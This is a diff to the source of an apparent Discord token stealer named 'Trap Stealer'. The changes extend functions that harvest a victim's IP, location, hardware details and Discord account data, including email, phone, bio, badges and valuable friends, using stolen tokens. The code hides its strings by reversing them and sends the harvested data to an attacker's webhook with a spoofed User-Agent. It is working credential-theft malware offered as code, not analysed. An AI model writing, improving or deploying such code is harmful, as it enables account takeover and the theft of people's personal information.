@@ -394,19 +394,11 @@ def globalInfo():
     computer_name = socket.gethostname()
     cores = os.cpu_count()
     gpu = ''
-
     if platform.system() == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
             gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-    elif platform.system() == 'Windows':
-        try:
-            result = subprocess.run(['nvidia-smi', '--query-gpu=gpu_name', '--format=csv,noheader'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            
-            if result.returncode == 0:
-                gpu = result.stdout.strip()
-        except Exception as e:
-            pass
+
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
@@ -437,8 +429,7 @@ badgeList =  [
     ]
 
 pub = 'cilbup'
-def get_uhq_friends(tokq):
-    
+def get_uhq_friends(tokq, max_friends=5):
     headers = {
         "Authorization": tokq,
         "Content-Type": "application/json",
@@ -451,7 +442,12 @@ def get_uhq_friends(tokq):
         return False
 
     uhqlist = ''
+    friend_count = 0 
+
     for friend in friendslist:
+        if friend_count >= max_friends:  
+            break
+
         owned_badges = ''
         flags = friend['user'][f'{pub[::-1]}_flags']
         for badge in badgeList:
@@ -461,8 +457,10 @@ def get_uhq_friends(tokq):
                 flags = flags % badge["Value"]
         if owned_badges != '':
             uhqlist += f"{owned_badges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
-    return uhqlist
 
+        friend_count += 1  
+
+    return uhqlist
 
 def get_badge(flags):
     if flags == 0:
@@ -487,6 +485,22 @@ def get_tokq_info(tokq):
     user_info = json.loads(response.read().decode())
 
     username = user_info["username"]
+    globalusername = 'None'
+    if "global_name" in user_info:
+        globalusername = user_info["global_name"]
+    bio = "None"
+    if "bio" in user_info:
+        bio = user_info["bio"]
+        if len(bio) > 70:
+            bio = bio[:67] + "..."
+    nsfw = ""
+    if "nsfw_allowed" in user_info:
+        nsfw = user_info["nsfw_allowed"]
+        if nsfw == "False":
+            nsfw = "❌"
+        else:
+            nsfw = "✅"
+            
     hashtag = user_info["discriminator"]
     emma = 'liame'
     ema = user_info.get(f"{emma[::-1]}", "")
@@ -507,7 +521,7 @@ def get_tokq_info(tokq):
     if "phone" in user_info:
         phone = f'`{user_info["phone"]}`'
 
-    return username, hashtag, ema, user_id, pfp, flags, nitro, phone
+    return username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone
 
 def checkTokq(Tokq):
     headers = {
@@ -547,7 +561,7 @@ def GetBilling(Tokq):
 
 
 def uploadTokq(Tokq, path):
-    username, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
+    username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
 
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
 
@@ -568,10 +582,10 @@ def uploadTokq(Tokq, path):
         "embeds": [
             {
                 "title": f"🍪 Trap Stealer {tok[::-1]}",
-                "description": f"`{path}` :\n",
+                "description": f"`Path` : {path}\n",
                 "color": 0xffb6c1,
                 "author": {
-                    "name": f"{username}#{hashtag} ({user_id})",
+                    "name": f"{username}#{hashtag} ({user_id}) Global Username : {globalusername}",
                     "icon_url": pfp
                 },
                 "footer": {
@@ -589,6 +603,16 @@ def uploadTokq(Tokq, path):
                     {
                         "name": ":mobile_phone: Phone:",
                         "value": phone,
+                        "inline": True
+                    },
+                    {
+                        "name": ":ribbon: Bio:",
+                        "value": bio,
+                        "inline": True
+                    },
+                    {
+                        "name": "🔞 Nsfw Enabled:",
+                        "value": nsfw,
                         "inline": True
                     },
                     {
@@ -617,8 +641,13 @@ def uploadTokq(Tokq, path):
         ],
         "attachments": []
     }
-
+    headers= {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+
 
 def upload_file(file_path):
     try:
@@ -835,6 +864,7 @@ def getTokq(path, arg):
                         if checkTokq(Tokq):
                             if not Tokq in Tokqs:
                                 Tokqs += Tokq
+                                print(Tokqs)
                                 uploadTokq(Tokq, path)
 
 def GetDiscord(path, arg):
